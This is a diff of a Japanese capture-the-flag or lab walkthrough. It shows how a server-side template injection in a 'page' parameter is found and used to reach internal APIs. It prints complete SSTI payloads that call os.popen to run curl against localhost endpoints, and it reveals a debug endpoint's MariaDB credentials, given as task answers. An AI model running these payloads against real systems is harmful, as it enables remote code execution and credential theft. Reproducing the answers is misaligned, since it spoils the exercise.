@@ -195,6 +195,46 @@ admin08043366033.com
 
 タスク4で確認した内部APIを、とある脆弱性を利用して実行してください。その結果から開発用のAPIの存在が確認できます。そのAPIのパス文字列を解答してください。
 
-nmap -sV -sC -p [PORT] [Target_IP]
+タスク4では、内部APIの存在を確認しました。この内部APIにアクセスできれば、サーバ内部からのみ閲覧できる情報が取得できそうです。そこで、内部APIにアクセスするために何らかの方法や脆弱性がないかを確認します。
 
-          
+http://<target1_ip>:8000/ にアクセスし製品タブをクリックすると、http://<target1_ip>:8000/?page=products.htmlにアクセスします。これより、pageパラメータにproducts.htmlを渡していることが分かります。
+
+ここでpageパラメータの値を適当な文字列aaaにして送信すると、受け取った文字列をそのまま表示していることが分かります。
+
+パラメータの値を表示するだけではなく、特定の記法が含まれていることを確認し、これに応じて処理をするというような仕組みがある場合、別の処理を実行できる可能性があります。
+
+この典型的な例としては、テンプレートエンジンが解釈する記法があります。そこで、pageパラメータの値を{{ 100 * 10 }}という文字列にすると、1000と返ってきます。
+
+よって、内部のテンプレートエンジンによって評価が行われ、計算処理が行われたことが分かります。
+
+つまり、任意のテンプレートを挿入できるサーバーサイド・テンプレート・インジェクション(Server-Side Template Injection:SSTI)脆弱性があることが分かります。
+
+SSTI脆弱性が存在する場合、任意のコードが実行できるためリバースシェルを取得することを考えます。しかし、このサーバはファイアウォールによってアウトバウンドへの通信が制限されているようです。
+
+そこで、逐次コマンドを実行しながらサーバ内を探索することにします。
+
+SSTI脆弱性を使って商品規格同期APIを実行してみましょう。そこで、/api/health を下記のパラメータで実行してみます。
+
+http://<target1_ip>:8000/?page={{%20request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27curl%20http://localhost:8010/api/health%27).read()%20}}
+すると、以下の値が帰ってきます。
+
+{"debug":"/api/debug","sync master":"/api/sync/master","sync slave":"/api/sync/slave"} 
+よって、タスク5の答えは、/api/debugとなります。
+
+### タスク６
+
+これはデバッグ用のAPIと思われるので、有益な情報が得られるかもしれません。そこで、/api/debug を下記のパラメータで実行してみます。
+
+http://<target1_ip>:8000/?page={{%20request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27curl%20http://localhost:8010/api/debug%27).read()%20}}
+すると、MariaDB(MySQL)のユーザ情報とパスワードを取得することができました。
+
+{"MASTER_DB":"mysql","MASTER_DB_PASSWORD":"frontier-facile-harbor-dock-indolent","MASTER_DB_USER":"phpmyadmin","SLAVE_DB":"sqlite"}
+よって、タスク6の答えは、phpmyadmin:frontier-facile-harbor-dock-indolentとなります。
+
+
+
+
+ミッション 2
+一般ユーザ権限の取得
+
+
